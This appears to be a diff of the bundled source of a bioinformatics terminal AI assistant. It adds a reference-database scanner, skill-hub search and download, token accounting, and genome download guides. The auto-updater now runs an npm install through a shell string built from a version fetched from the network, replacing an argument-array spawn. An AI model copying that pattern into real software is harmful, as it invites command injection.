-          process.stdout.write("\r\x1B[2K");
+        if (stats) {
+          if (result.error) stats.failCmds++;
+          else stats.successCmds++;
         }
+        clearSpinner();
         const elapsed = ((Date.now() - t0) / 1e3).toFixed(1);
         const doneIcon = result.error ? source_default.yellow("\u2717") : source_default.green("\u2713");
         if (isBash && streamedLines > 0) {
@@ -14142,18 +14449,25 @@ OUTPUT: ${result.output}` : result.output
   }
   return finalText;
 }
-async function streamOnce(client, messages, model) {
+async function streamOnce(client, messages, model, signal) {
   const stream = await client.chat.completions.create({
     model,
     messages,
     tools: TOOL_DEFINITIONS,
-    stream: true
-  });
+    stream: true,
+    stream_options: { include_usage: true }
+  }, { signal });
   let text = "";
   const toolCallMap = {};
   let finishReason = null;
+  let inputTokens = 0;
+  let outputTokens = 0;
   process.stdout.write(source_default.green("BGI \u203A "));
   for await (const chunk of stream) {
+    if (chunk.usage) {
+      inputTokens = chunk.usage.prompt_tokens ?? 0;
+      outputTokens = chunk.usage.completion_tokens ?? 0;
+    }
     const choice = chunk.choices[0];
     if (!choice) continue;
     const delta = choice.delta;
@@ -14184,7 +14498,9 @@ async function streamOnce(client, messages, model) {
   return {
     text,
     toolCalls: Object.values(toolCallMap),
-    finishReason
+    finishReason,
+    inputTokens,
+    outputTokens
   };
 }
 function estimateTokens(messages) {
@@ -14281,7 +14597,7 @@ function summarizeArgs(args) {
 }
 
 // src/prompt.ts
-function buildSystemPrompt() {
+function buildSystemPrompt(dbSection) {
   return `You are **BGI CLI**, a specialized bioinformatics AI assistant built for Chinese biological researchers. You run inside a terminal and can execute code, read/write files, and run bash commands to help with real bioinformatics analysis tasks.
 
 ## Core Identity
@@ -14386,7 +14702,15 @@ Python tools are at: **${TOOLS_DIR}**
 
 ---
 
-## OpenClaw Medical Skills (868\u4E2A\u4E13\u79D1\u6280\u80FD)
+## \u53C2\u8003\u6570\u636E\u5E93 & \u7D22\u5F15
+
+${dbSection ?? "\uFF08\u6682\u672A\u6CE8\u518C\u4EFB\u4F55\u6570\u636E\u5E93\u3002\u4F7F\u7528 /db scan \u81EA\u52A8\u626B\u63CF\uFF0C\u6216 /db add <\u8DEF\u5F84> \u624B\u52A8\u6DFB\u52A0\uFF09"}
+
+**\u4F7F\u7528\u539F\u5219**\uFF1A\u5206\u6790\u65F6\u4F18\u5148\u4F7F\u7528\u5DF2\u6CE8\u518C\u7684\u672C\u5730\u6570\u636E\u5E93\u8DEF\u5F84\uFF0C\u65E0\u9700\u91CD\u590D\u4E0B\u8F7D\u3002\u8DEF\u5F84\u5E26 \u26A0 \u8868\u793A\u6587\u4EF6\u5DF2\u4E0D\u5B58\u5728\uFF0C\u9700\u91CD\u65B0\u786E\u8BA4\u3002
+
+---
+
+## OpenClaw Medical Skills (979\u4E2A\u4E13\u79D1\u6280\u80FD)
 
 \u6280\u80FD\u5E93\u4F4D\u4E8E: **${SKILLS_DIR}**
 
@@ -14537,6 +14861,273 @@ message(sprintf("\u603B\u57FA\u56E0\u6570: %d | \u663E\u8457 DEG: %d (\u4E0A\u8C
 **\u7528\u6237\u8BF4 "\u5E2E\u6211\u5206\u6790 GSE12345" / "\u4E0B\u8F7D GEO \u6570\u636E" \u2192**
 \u2192 \u7ACB\u5373\u8C03\u7528 fetch_geo("GSE12345") \u83B7\u53D6\u5143\u6570\u636E\u548C\u4E0B\u8F7D\u4EE3\u7801\uFF0C\u65E0\u9700\u8BA9\u7528\u6237\u624B\u52A8\u4E0B\u8F7D`;
 }
+
+// src/databases.ts
+var import_fs4 = require("fs");
+var import_path4 = require("path");
+var import_os3 = require("os");
+function loadDbRegistry() {
+  if (!(0, import_fs4.existsSync)(DATABASES_FILE)) {
+    return { version: 1, lastScan: null, databases: {} };
+  }
+  try {
+    return JSON.parse((0, import_fs4.readFileSync)(DATABASES_FILE, "utf8"));
+  } catch {
+    return { version: 1, lastScan: null, databases: {} };
+  }
+}
+function saveDbRegistry(registry) {
+  (0, import_fs4.writeFileSync)(DATABASES_FILE, JSON.stringify(registry, null, 2), "utf8");
+}
+function addDbEntry(registry, entry) {
+  const id = entry.id ?? slugify(`${entry.genome}-${entry.type}-${Date.now()}`);
+  const full = { ...entry, id, addedAt: (/* @__PURE__ */ new Date()).toISOString() };
+  registry.databases[id] = full;
+  return full;
+}
+function removeDbEntry(registry, id) {
+  if (!registry.databases[id]) return false;
+  delete registry.databases[id];
+  return true;
+}
+function slugify(s2) {
+  return s2.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+}
+var FILE_PATTERNS = [
+  // Reference FASTA
+  { regex: /\bhg38\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "hg38" },
+  { regex: /\bGRCh38\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "hg38" },
+  { regex: /\bhg19\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "hg19" },
+  { regex: /\bGRCh37\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "hg19" },
+  { regex: /\bmm10\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "mm10" },
+  { regex: /\bGRCm38\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "mm10" },
+  { regex: /\bmm39\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "mm39" },
+  { regex: /\bGRCm39\b.*\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "mm39" },
+  { regex: /\.f(ast)?a(\.gz)?$/i, type: "fasta", genome: "other" },
+  // GTF / GFF
+  { regex: /\bhg38\b.*\.gtf(\.gz)?$/i, type: "gtf", genome: "hg38" },
+  { regex: /\bGRCh38\b.*\.gtf(\.gz)?$/i, type: "gtf", genome: "hg38" },
+  { regex: /\bhg19\b.*\.gtf(\.gz)?$/i, type: "gtf", genome: "hg19" },
+  { regex: /\bmm10\b.*\.gtf(\.gz)?$/i, type: "gtf", genome: "mm10" },
+  { regex: /\.gtf(\.gz)?$/i, type: "gtf", genome: "other" },
+  { regex: /\.gff3?(\.gz)?$/i, type: "gff3", genome: "other" },
+  // VCF databases
+  { regex: /dbsnp.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  { regex: /clinvar.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  { regex: /gnomad.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  { regex: /mills.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  { regex: /1000G.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  { regex: /hapmap.*\.vcf(\.gz)?$/i, type: "vcf", genome: "hg38" },
+  // BED
+  { regex: /\.(bed|bed\.gz)$/i, type: "bed", genome: "other" }
+];
+var DIR_PATTERNS = [
+  { regex: /star.*index|star_genome/i, type: "star_index", indicator: "Genome.sjdbInfo.txt" },
+  { regex: /hisat2.*index/i, type: "hisat2_index", indicator: ".ht2" },
+  { regex: /salmon.*index/i, type: "salmon_index", indicator: "info.json" },
+  { regex: /kraken2?/i, type: "kraken2_db", indicator: "hash.k2d" },
+  { regex: /diamond/i, type: "diamond_db", indicator: ".dmnd" },
+  { regex: /blast_db|blastdb/i, type: "blast_db", indicator: ".nsq" }
+];
+function defaultSearchRoots() {
+  const home = (0, import_os3.homedir)();
+  const roots = [
+    "/data",
+    "/ref",
+    "/reference",
+    "/genomes",
+    "/databases",
+    "/db",
+    "/lustre",
+    "/GPFS",
+    "/scratch",
+    "/work",
+    "/shared",
+    (0, import_path4.join)(home, "databases"),
+    (0, import_path4.join)(home, "data"),
+    (0, import_path4.join)(home, "reference"),
+    (0, import_path4.join)(home, "ref"),
+    process.cwd()
+  ];
+  return roots.filter((r2) => (0, import_fs4.existsSync)(r2));
+}
+function detectGenomeFromPath(path) {
+  const p2 = path.toLowerCase();
+  if (p2.includes("hg38") || p2.includes("grch38")) return "hg38";
+  if (p2.includes("hg19") || p2.includes("grch37") || p2.includes("b37")) return "hg19";
+  if (p2.includes("mm10") || p2.includes("grcm38")) return "mm10";
+  if (p2.includes("mm39") || p2.includes("grcm39")) return "mm39";
+  if (p2.includes("rn7")) return "rn7";
+  if (p2.includes("dm6")) return "dm6";
+  if (p2.includes("danrer")) return "danRer11";
+  return "other";
+}
+function labelFor(type, genome, name) {
+  const typeLabels = {
+    fasta: "\u53C2\u8003\u57FA\u56E0\u7EC4 FASTA",
+    gtf: "\u57FA\u56E0\u6CE8\u91CA GTF",
+    gff3: "\u57FA\u56E0\u6CE8\u91CA GFF3",
+    vcf: "VCF \u53D8\u5F02\u6570\u636E\u5E93",
+    bed: "BED \u533A\u57DF\u6587\u4EF6",
+    star_index: "STAR \u6BD4\u5BF9\u7D22\u5F15",
+    hisat2_index: "HISAT2 \u6BD4\u5BF9\u7D22\u5F15",
+    bwa_index: "BWA \u6BD4\u5BF9\u7D22\u5F15",
+    bowtie2_index: "Bowtie2 \u6BD4\u5BF9\u7D22\u5F15",
+    salmon_index: "Salmon \u5B9A\u91CF\u7D22\u5F15",
+    kraken2_db: "Kraken2 \u5B8F\u57FA\u56E0\u7EC4\u5E93",
+    diamond_db: "DIAMOND \u86CB\u767D\u5E93",
+    blast_db: "BLAST \u6570\u636E\u5E93",
+    other: "\u6570\u636E\u5E93"
+  };
+  const genomeLabel = genome !== "other" ? ` (${genome})` : "";
+  return `${typeLabels[type]}${genomeLabel} \u2014 ${name}`;
+}
+function scanForDatabases(extraRoots = []) {
+  const roots = [...defaultSearchRoots(), ...extraRoots.map((r2) => (0, import_path4.resolve)(r2))];
+  const found = [];
+  const seen = /* @__PURE__ */ new Set();
+  let skippedDirs = 0;
+  function walk(dir, depth) {
+    if (depth > 4) return;
+    let entries;
+    try {
+      entries = (0, import_fs4.readdirSync)(dir);
+    } catch {
+      skippedDirs++;
+      return;
+    }
+    for (const name of entries) {
+      if (name.startsWith(".")) continue;
+      const fullPath = (0, import_path4.join)(dir, name);
+      let stat;
+      try {
+        stat = (0, import_fs4.statSync)(fullPath);
+      } catch {
+        continue;
+      }
+      if (stat.isDirectory()) {
+        for (const dp of DIR_PATTERNS) {
+          if (dp.regex.test(name)) {
+            if (!dp.indicator || (0, import_fs4.readdirSync)(fullPath).some((f2) => f2.endsWith(dp.indicator))) {
+              const genome = detectGenomeFromPath(fullPath);
+              const id = slugify(`${genome}-${dp.type}-${(0, import_path4.basename)(fullPath)}`);
+              if (!seen.has(fullPath)) {
+                seen.add(fullPath);
+                found.push({
+                  id,
+                  genome,
+                  type: dp.type,
+                  path: fullPath,
+                  label: labelFor(dp.type, genome, name),
+                  addedAt: (/* @__PURE__ */ new Date()).toISOString(),
+                  source: "scan"
+                });
+              }
+              break;
+            }
+          }
+        }
+        if (!DIR_PATTERNS.some((dp) => dp.regex.test(name))) {
+          try {
+            const sub = (0, import_fs4.readdirSync)(fullPath);
+            if (sub.some((f2) => f2.endsWith(".bwt")) && sub.some((f2) => f2.endsWith(".ann"))) {
+              const genome = detectGenomeFromPath(fullPath);
+              const id = slugify(`${genome}-bwa_index-${(0, import_path4.basename)(fullPath)}`);
+              if (!seen.has(fullPath)) {
+                seen.add(fullPath);
+                found.push({ id, genome, type: "bwa_index", path: fullPath, label: labelFor("bwa_index", genome, name), addedAt: (/* @__PURE__ */ new Date()).toISOString(), source: "scan" });
+              }
+            }
+          } catch {
+          }
+          walk(fullPath, depth + 1);
+        }
+      } else if (stat.isFile()) {
+        for (const fp of FILE_PATTERNS) {
+          if (fp.regex.test(name)) {
+            const genome = fp.genome === "other" ? detectGenomeFromPath(fullPath) : fp.genome;
+            const id = slugify(`${genome}-${fp.type}-${name.replace(/\.gz$/, "").replace(/\.[^.]+$/, "")}`);
+            if (!seen.has(fullPath)) {
+              seen.add(fullPath);
+              found.push({
+                id,
+                genome,
+                type: fp.type,
+                path: fullPath,
+                label: labelFor(fp.type, genome, name),
+                sizeBytes: stat.size,
+                addedAt: (/* @__PURE__ */ new Date()).toISOString(),
+                source: "scan"
+              });
+            }
+            break;
+          }
+        }
+      }
+    }
+  }
+  for (const root of new Set(roots)) {
+    walk(root, 0);
+  }
+  return { found, skippedDirs };
+}
+function buildDbPromptSection(registry) {
+  const entries = Object.values(registry.databases);
+  if (entries.length === 0) {
+    return "\uFF08\u6682\u672A\u6CE8\u518C\u4EFB\u4F55\u6570\u636E\u5E93\u3002\u4F7F\u7528 /db scan \u81EA\u52A8\u626B\u63CF\uFF0C\u6216 /db add <\u8DEF\u5F84> \u624B\u52A8\u6DFB\u52A0\uFF09";
+  }
+  const byGenome = {};
+  for (const e2 of entries) {
+    (byGenome[e2.genome] ??= []).push(e2);
+  }
+  const lines = [];
+  for (const [genome, dbs] of Object.entries(byGenome).sort()) {
+    lines.push(`### ${genome}`);
+    for (const db of dbs.sort((a2, b2) => a2.type.localeCompare(b2.type))) {
+      const exists = (0, import_fs4.existsSync)(db.path) ? "" : " \u26A0(\u8DEF\u5F84\u4E0D\u5B58\u5728)";
+      const size = db.sizeBytes ? ` [${(db.sizeBytes / 1e9).toFixed(1)}GB]` : "";
+      lines.push(`- **${db.label}** (\`${db.type}\`): \`${db.path}\`${size}${exists}`);
+    }
+    lines.push("");
+  }
+  return lines.join("\n").trim();
+}
+var DOWNLOAD_GUIDES = {
+  "hg38-fasta": {
+    label: "GRCh38 \u53C2\u8003\u57FA\u56E0\u7EC4 (UCSC)",
+    cmds: [
+      "wget https://hgdownload.soe.ucsc.edu/goldenPath/hg38/bigZips/hg38.fa.gz",
+      "gunzip hg38.fa.gz && samtools faidx hg38.fa"
+    ]
+  },
+  "hg19-fasta": {
+    label: "GRCh37/hg19 \u53C2\u8003\u57FA\u56E0\u7EC4 (UCSC)",
+    cmds: [
+      "wget https://hgdownload.soe.ucsc.edu/goldenPath/hg19/bigZips/hg19.fa.gz",
+      "gunzip hg19.fa.gz && samtools faidx hg19.fa"
+    ]
+  },
+  "mm10-fasta": {
+    label: "GRCm38/mm10 \u53C2\u8003\u57FA\u56E0\u7EC4 (UCSC)",
+    cmds: ["wget https://hgdownload.soe.ucsc.edu/goldenPath/mm10/bigZips/mm10.fa.gz"]
+  },
+  "hg38-gtf": {
+    label: "Ensembl hg38 \u57FA\u56E0\u6CE8\u91CA GTF",
+    cmds: ["wget https://ftp.ensembl.org/pub/release-110/gtf/homo_sapiens/Homo_sapiens.GRCh38.110.gtf.gz"]
+  },
+  "hg38-dbsnp": {
+    label: "dbSNP b156 VCF (hg38)",
+    cmds: ["wget https://ftp.ncbi.nlm.nih.gov/snp/latest_release/VCF/GCF_000001405.40.gz"]
+  },
+  "hg38-clinvar": {
+    label: "ClinVar VCF (hg38)",
+    cmds: ["wget https://ftp.ncbi.nlm.nih.gov/pub/clinvar/vcf_GRCh38/clinvar.vcf.gz"]
+  },
+  "hg38-gnomad": {
+    label: "gnomAD v4 sites VCF (hg38)",
+    cmds: ["# See https://gnomad.broadinstitute.org/downloads for latest URLs"]
+  }
+};
 
 // src/skillRouter.ts
 var SKILL_CATEGORIES = {
@@ -15285,17 +15876,17 @@ function routeSkill(message) {
 }
 
 // src/sessions.ts
-var import_fs4 = require("fs");
-var import_path4 = require("path");
-var SESSIONS_DIR = (0, import_path4.join)(BGI_DIR, "sessions");
-var CHECKPOINTS_DIR = (0, import_path4.join)(BGI_DIR, "checkpoints");
+var import_fs5 = require("fs");
+var import_path5 = require("path");
+var SESSIONS_DIR = (0, import_path5.join)(BGI_DIR, "sessions");
+var CHECKPOINTS_DIR = (0, import_path5.join)(BGI_DIR, "checkpoints");
 function ensureSessionDirs() {
   for (const d2 of [SESSIONS_DIR, CHECKPOINTS_DIR]) {
-    if (!(0, import_fs4.existsSync)(d2)) (0, import_fs4.mkdirSync)(d2, { recursive: true });
+    if (!(0, import_fs5.existsSync)(d2)) (0, import_fs5.mkdirSync)(d2, { recursive: true });
   }
 }
 function sessionPath(id) {
-  return (0, import_path4.join)(SESSIONS_DIR, `${id}.json`);
+  return (0, import_path5.join)(SESSIONS_DIR, `${id}.json`);
 }
 function newSessionId() {
   const now = /* @__PURE__ */ new Date();
@@ -15319,25 +15910,25 @@ function saveSession(id, name, messages, skills, createdAt) {
     preview,
     messages
   };
-  (0, import_fs4.writeFileSync)(sessionPath(id), JSON.stringify(session, null, 2), "utf8");
+  (0, import_fs5.writeFileSync)(sessionPath(id), JSON.stringify(session, null, 2), "utf8");
 }
 function loadSession(id) {
   ensureSessionDirs();
   const p2 = sessionPath(id);
-  if (!(0, import_fs4.existsSync)(p2)) return null;
+  if (!(0, import_fs5.existsSync)(p2)) return null;
   try {
-    return JSON.parse((0, import_fs4.readFileSync)(p2, "utf8"));
+    return JSON.parse((0, import_fs5.readFileSync)(p2, "utf8"));
   } catch {
     return null;
   }
 }
 function listSessions() {
   ensureSessionDirs();
-  const files = (0, import_fs4.readdirSync)(SESSIONS_DIR).filter((f2) => f2.endsWith(".json"));
+  const files = (0, import_fs5.readdirSync)(SESSIONS_DIR).filter((f2) => f2.endsWith(".json"));
   const metas = [];
   for (const f2 of files) {
     try {
-      const raw = JSON.parse((0, import_fs4.readFileSync)((0, import_path4.join)(SESSIONS_DIR, f2), "utf8"));
+      const raw = JSON.parse((0, import_fs5.readFileSync)((0, import_path5.join)(SESSIONS_DIR, f2), "utf8"));
       metas.push({
         id: raw.id,
         name: raw.name,
@@ -15354,8 +15945,8 @@ function listSessions() {
 }
 function deleteSession(id) {
   const p2 = sessionPath(id);
-  if (!(0, import_fs4.existsSync)(p2)) return false;
-  (0, import_fs4.unlinkSync)(p2);
+  if (!(0, import_fs5.existsSync)(p2)) return false;
+  (0, import_fs5.unlinkSync)(p2);
   return true;
 }
 function getLastSession() {
@@ -15363,7 +15954,7 @@ function getLastSession() {
   return all[0] ?? null;
 }
 function checkpointPath(id) {
-  return (0, import_path4.join)(CHECKPOINTS_DIR, `${id}.json`);
+  return (0, import_path5.join)(CHECKPOINTS_DIR, `${id}.json`);
 }
 function saveCheckpoint(sessionId, label, messages, skills) {
   ensureSessionDirs();
@@ -15377,16 +15968,16 @@ function saveCheckpoint(sessionId, label, messages, skills) {
     messages,
     skills
   };
-  (0, import_fs4.writeFileSync)(checkpointPath(id), JSON.stringify(cp, null, 2), "utf8");
+  (0, import_fs5.writeFileSync)(checkpointPath(id), JSON.stringify(cp, null, 2), "utf8");
   return id;
 }
 function listCheckpoints(sessionId) {
   ensureSessionDirs();
-  const files = (0, import_fs4.readdirSync)(CHECKPOINTS_DIR).filter((f2) => f2.endsWith(".json"));
+  const files = (0, import_fs5.readdirSync)(CHECKPOINTS_DIR).filter((f2) => f2.endsWith(".json"));
   const cps = [];
   for (const f2 of files) {
     try {
-      const cp = JSON.parse((0, import_fs4.readFileSync)((0, import_path4.join)(CHECKPOINTS_DIR, f2), "utf8"));
+      const cp = JSON.parse((0, import_fs5.readFileSync)((0, import_path5.join)(CHECKPOINTS_DIR, f2), "utf8"));
       if (!sessionId || cp.sessionId === sessionId) cps.push(cp);
     } catch {
     }
@@ -15395,8 +15986,8 @@ function listCheckpoints(sessionId) {
 }
 function deleteCheckpoint(id) {
   const p2 = checkpointPath(id);
-  if (!(0, import_fs4.existsSync)(p2)) return false;
-  (0, import_fs4.unlinkSync)(p2);
+  if (!(0, import_fs5.existsSync)(p2)) return false;
+  (0, import_fs5.unlinkSync)(p2);
   return true;
 }
 function clearCheckpoints(sessionId) {
@@ -15409,8 +16000,86 @@ function clearCheckpoints(sessionId) {
 }
 
 // src/index.ts
-var import_fs6 = require("fs");
-var VERSION2 = "2.2.10";
+var import_fs7 = require("fs");
+var VERSION2 = "2.4.2";
+var SKILLHUB_HUBS = {
+  bgi: { label: "BGI\u5185\u7F51", apiBase: "https://clawhub.ai", backend: "clawhub" },
+  clawhub: { label: "clawhub.ai", apiBase: "https://clawhub.ai", backend: "clawhub" },
+  tencent: { label: "Tencent", apiBase: "https://lightmake.site", backend: "tencent" }
+};
+function httpGetJson(url) {
+  const mod = url.startsWith("https") ? import_https2.get : require("http").get;
+  return new Promise((resolve4, reject) => {
+    const req = mod(url, { headers: { "User-Agent": `bgicli/${VERSION2}`, Accept: "application/json" } }, (res) => {
+      const chunks = [];
+      res.on("data", (c2) => chunks.push(c2));
+      res.on("end", () => {
+        try {
+          resolve4(JSON.parse(Buffer.concat(chunks).toString()));
+        } catch (e2) {
+          reject(new Error(`JSON parse error from ${url}`));
+        }
+      });
+    });
+    req.setTimeout(1e4, () => {
+      req.destroy();
+      reject(new Error("timeout"));
+    });
+    req.on("error", reject);
+  });
+}
+async function searchSkillHub(query, hub, limit2 = 10) {
+  const cfg = SKILLHUB_HUBS[hub];
+  if (cfg.backend === "tencent") {
+    const data = await httpGetJson(
+      `${cfg.apiBase}/api/skills?page=1&pageSize=${limit2}&keyword=${encodeURIComponent(query)}`
+    );
+    if (data.code !== 0 || !data.data?.skills) return [];
+    return data.data.skills.map((s2) => ({
+      slug: s2.slug,
+      name: s2.name,
+      summary: s2.description ?? "",
+      version: s2.version,
+      owner: s2.ownerName ?? (s2.homepage ? s2.homepage.replace(/.*clawhub\.ai\/([^/]+)\/.*/, "$1") : void 0)
+    }));
+  } else {
+    const data = await httpGetJson(
+      `${cfg.apiBase}/api/v1/search?q=${encodeURIComponent(query)}&limit=${limit2}&nonSuspiciousOnly=true`
+    );
+    if (!data.results) return [];
+    return data.results.map((s2) => ({
+      slug: s2.slug,
+      name: s2.displayName ?? s2.slug,
+      summary: s2.summary ?? "",
+      version: s2.version ?? void 0
+    }));
+  }
+}
+async function downloadSkillMd(slug) {
+  const data = await new Promise((resolve4, reject) => {
+    const req = (0, import_https2.get)(
+      `https://clawhub.ai/api/v1/skills/${encodeURIComponent(slug)}/file?path=SKILL.md`,
+      { headers: { "User-Agent": `bgicli/${VERSION2}` } },
+      (res) => {
+        if (res.statusCode === 404) {
+          req.destroy();
+          reject(new Error("not_found"));
+          return;
+        }
+        const chunks = [];
+        res.on("data", (c2) => chunks.push(c2));
+        res.on("end", () => resolve4(Buffer.concat(chunks).toString()));
+      }
+    );
+    req.setTimeout(15e3, () => {
+      req.destroy();
+      reject(new Error("timeout"));
+    });
+    req.on("error", reject);
+  });
+  return data;
+}
+var _lastSearchResults = [];
 function isNewer(latest, current) {
   const [lM, lm, lp] = latest.split(".").map(Number);
   const [cM, cm, cp] = current.split(".").map(Number);
@@ -15421,7 +16090,7 @@ function isNewer(latest, current) {
 async function checkAndAutoUpdate() {
   let latest;
   try {
-    latest = await new Promise((resolve3, reject) => {
+    latest = await new Promise((resolve4, reject) => {
       const req = (0, import_https2.get)(
         "https://registry.npmjs.org/@bgicli/bgicli/latest",
         { headers: { "User-Agent": `bgicli/${VERSION2}` } },
@@ -15430,7 +16099,7 @@ async function checkAndAutoUpdate() {
           res.on("data", (c2) => chunks.push(c2));
           res.on("end", () => {
             try {
-              resolve3(JSON.parse(Buffer.concat(chunks).toString()).version);
+              resolve4(JSON.parse(Buffer.concat(chunks).toString()).version);
             } catch {
               reject(new Error("parse"));
             }
@@ -15452,15 +16121,11 @@ async function checkAndAutoUpdate() {
   \u{1F504} \u53D1\u73B0\u65B0\u7248\u672C v${latest}\uFF08\u5F53\u524D v${VERSION2}\uFF09\uFF0C\u6B63\u5728\u81EA\u52A8\u66F4\u65B0...
 `)
   );
-  const ok = await new Promise((resolve3) => {
-    const isWin = process.platform === "win32";
-    const child = (0, import_child_process2.spawn)(
-      isWin ? "npm.cmd" : "npm",
-      ["install", "-g", `@bgicli/bgicli@${latest}`, "--registry", "https://registry.npmjs.org"],
-      { stdio: "inherit", shell: false }
+  const ok = await new Promise((resolve4) => {
+    (0, import_child_process2.exec)(
+      `npm install -g @bgicli/bgicli@${latest} --registry https://registry.npmjs.org`,
+      (error) => resolve4(!error)
     );
-    child.on("close", (code) => resolve3(code === 0));
-    child.on("error", () => resolve3(false));
   });
   if (ok) {
     process.stdout.write(source_default.green(`  \u2713 \u5DF2\u66F4\u65B0\u81F3 v${latest}\uFF0C\u91CD\u542F bgi \u540E\u751F\u6548
@@ -15477,31 +16142,41 @@ var SESSION_CTX = {
   createdAt: "",
   wdirSnapshot: null
 };
+var dbRegistry = { version: 1, lastScan: null, databases: {} };
+var systemPrompt = "";
 function installBundledData() {
-  const bundledData = (0, import_path5.join)(__dirname, "..", "data");
-  if (!(0, import_fs5.existsSync)(bundledData)) return;
+  const bundledData = (0, import_path6.join)(__dirname, "..", "data");
+  if (!(0, import_fs6.existsSync)(bundledData)) return;
   ensureDirs();
+  const installedDataVersion = (0, import_fs6.existsSync)(DATA_VERSION_FILE) ? (0, import_fs6.readFileSync)(DATA_VERSION_FILE, "utf8").trim() : "";
+  const needsUpdate = installedDataVersion !== VERSION2;
   const targets = [
-    { src: (0, import_path5.join)(bundledData, "workflows"), dest: WORKFLOWS_DIR, name: "Skills (\u751F\u4FE1\u5DE5\u4F5C\u6D41)" },
-    { src: (0, import_path5.join)(bundledData, "skills"), dest: SKILLS_DIR, name: "Skills (\u533B\u5B66\u4E13\u79D1)" },
-    { src: (0, import_path5.join)(bundledData, "tools"), dest: TOOLS_DIR, name: "\u5DE5\u5177" }
+    { src: (0, import_path6.join)(bundledData, "workflows"), dest: WORKFLOWS_DIR, name: "Skills (\u751F\u4FE1\u5DE5\u4F5C\u6D41)" },
+    { src: (0, import_path6.join)(bundledData, "skills"), dest: SKILLS_DIR, name: "Skills (\u533B\u5B66\u4E13\u79D1)" },
+    { src: (0, import_path6.join)(bundledData, "tools"), dest: TOOLS_DIR, name: "\u5DE5\u5177" }
   ];
   let installed = false;
   for (const { src, dest, name } of targets) {
-    if (!(0, import_fs5.existsSync)(src)) continue;
-    const isEmpty = !(0, import_fs5.existsSync)(dest) || (0, import_fs5.readdirSync)(dest).length === 0;
-    if (isEmpty) {
-      (0, import_fs5.mkdirSync)(dest, { recursive: true });
-      (0, import_fs5.cpSync)(src, dest, { recursive: true });
+    if (!(0, import_fs6.existsSync)(src)) continue;
+    const isEmpty = !(0, import_fs6.existsSync)(dest) || (0, import_fs6.readdirSync)(dest).length === 0;
+    if (isEmpty || needsUpdate) {
+      (0, import_fs6.mkdirSync)(dest, { recursive: true });
+      (0, import_fs6.cpSync)(src, dest, { recursive: true, force: true });
       if (!installed) {
-        process.stdout.write(source_default.dim("\u6B63\u5728\u521D\u59CB\u5316\u5185\u7F6E\u6570\u636E...\n"));
+        process.stdout.write(source_default.dim(needsUpdate && !isEmpty ? `\u66F4\u65B0\u5185\u7F6E\u6570\u636E\u5230 v${VERSION2}...
+` : "\u6B63\u5728\u521D\u59CB\u5316\u5185\u7F6E\u6570\u636E...\n"));
         installed = true;
       }
-      process.stdout.write(source_default.green(`  \u2713 ${name} \u5DF2\u5B89\u88C5
+      process.stdout.write(source_default.green(`  \u2713 ${name} \u5DF2${needsUpdate && !isEmpty ? "\u66F4\u65B0" : "\u5B89\u88C5"}
 `));
     }
   }
-  if (installed) console.log();
+  if (installed) {
+    (0, import_fs6.writeFileSync)(DATA_VERSION_FILE, VERSION2, "utf8");
+    console.log();
+  } else if (needsUpdate) {
+    (0, import_fs6.writeFileSync)(DATA_VERSION_FILE, VERSION2, "utf8");
+  }
 }
 function printBanner() {
   console.log(source_default.cyan.bold(`
@@ -15559,8 +16234,19 @@ function printHelp() {
   console.log(source_default.bold.cyan("\u2500\u2500\u2500 \u5DE5\u4F5C\u6D41\u5411\u5BFC \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
   console.log(`  ${source_default.cyan("/run")} <skill-id>     \u4EA4\u4E92\u5F0F\u53C2\u6570\u5411\u5BFC\uFF0C\u81EA\u52A8\u751F\u6210\u5E76\u6267\u884C\u5206\u6790\u811A\u672C`);
   console.log(`  ${source_default.cyan("/check-env")} [id]     \u68C0\u6D4B Skill \u6240\u9700 R/Python \u5305\u662F\u5426\u5DF2\u5B89\u88C5`);
-  console.log(`  ${source_default.cyan("/install")} <url>      \u4ECE GitHub \u5B89\u88C5\u7B2C\u4E09\u65B9 Skill`);
+  console.log(`  ${source_default.cyan("/search")} <\u5173\u952E\u8BCD>    \u5728 SkillHub \u641C\u7D22\u5E76\u4E0B\u8F7D\u6280\u80FD ${source_default.dim("[--hub=bgi|clawhub|tencent]")}`);
+  console.log(`  ${source_default.cyan("/install")} <url|slug> \u4ECE GitHub \u6216 SkillHub \u5B89\u88C5 Skill\uFF08\u542B\u5B89\u5168\u626B\u63CF\uFF09`);
   console.log(`  ${source_default.cyan("/uninstall")} <id>     \u5378\u8F7D\u5DF2\u5B89\u88C5\u7684\u7B2C\u4E09\u65B9 Skill`);
+  console.log();
+  console.log(source_default.bold.cyan("\u2500\u2500\u2500 \u6570\u636E\u5E93\u7BA1\u7406 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"));
+  console.log(`  ${source_default.cyan("/db list")}            \u5217\u51FA\u5DF2\u6CE8\u518C\u53C2\u8003\u6570\u636E\u5E93`);
+  console.log(`  ${source_default.cyan("/db add")} <\u8DEF\u5F84>      \u624B\u52A8\u6CE8\u518C\u6570\u636E\u5E93\u8DEF\u5F84\uFF08\u957F\u671F\u4FDD\u5B58\uFF09`);
